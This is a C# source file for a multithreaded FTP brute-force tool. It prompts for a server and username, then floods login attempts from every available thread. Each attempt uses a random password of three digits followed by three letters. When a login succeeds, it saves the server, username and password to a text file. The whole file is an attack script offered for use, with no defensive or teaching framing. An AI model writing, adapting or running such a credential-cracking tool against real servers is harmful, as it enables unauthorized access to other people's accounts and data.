using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Threading;
using System.Timers;
using System.Diagnostics;
using WebCamService;

namespace BruteForceFTP
{
    public class FTPBrute
    {
        public static String srv;
        public static String usr;

        private static bool foundLogin = false;
        private static Random rand = new Random();
        private static int attempts = 0;

        static String Ftp_Srv()
        {
            Console.Write("Enter FTP Server: ");
            srv = Console.ReadLine();
            return srv;
        }

        static String Ftp_Usr()
        {
            Console.Write("Enter FTP Username: ");
            usr = Console.ReadLine();
            return usr;
        }

        static void PrepareBrute()
        {
            Ftp_Srv();
            Ftp_Usr();
            Console.WriteLine("");
        }

        protected int pwd_first(int start, int end)
        {
            int pwd_first;
            pwd_first = rand.Next(start, end);
            return pwd_first;
        }


        protected String pwd_second(int length)
        {
            var chars = "abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[rand.Next(s.Length)]).ToArray());
        }

        public void Brute(String srv, String usr)
        {
            while (!foundLogin)
            {
                String pwd_num = pwd_first(500, 600).ToString();
                String pwd_chr = pwd_second(3).ToString();
                var pwd = pwd_num + pwd_chr;

                FtpClient ftp = new FtpClient(srv, usr, pwd);

                try
                {
                    ftp.Login();
                }
                catch (FtpClient.FtpException e)
                {

                    var path = (Directory.GetCurrentDirectory() + @"\" + usr + ".txt");
                    switch (e.Message)
                    {
                        case "530":
                            attempts += 1;
                            Console.Write("\rAttempts: {0}", attempts);

                            break;
                        case "230":
                            Console.WriteLine("\nSuccessfully acquired login details after {0} attempts, Saving. [+]", attempts);
                            File.WriteAllText(path, "ftp://" + srv.ToString() + "::" + usr + "::" + pwd);

                            Environment.Exit(-1);
                            foundLogin = true;

                            break;
                    }
                }
            }
        }

        public class Threading : FTPBrute
        {
            public void createBruteThreads()
            {
                int workerThreadCount;
                int ioThreadCount;

                ThreadPool.GetMaxThreads(out workerThreadCount, out ioThreadCount);

                ThreadPool.SetMaxThreads(workerThreadCount, ioThreadCount);

                for (int i = 0; i < workerThreadCount; i++)
                {
                    // Console.WriteLine("ACTIVE :: " + i);

                    Task newThread = Task.Run(() =>
                    {
                        Brute(srv, usr);
                    });
                }
            }
        }


        static void Main()
        {
            Threading Threading = new Threading();
            FTPBrute Program = new FTPBrute();

            PrepareBrute();

            Threading.createBruteThreads();
            Program.Brute(srv, usr);
        }
    }
}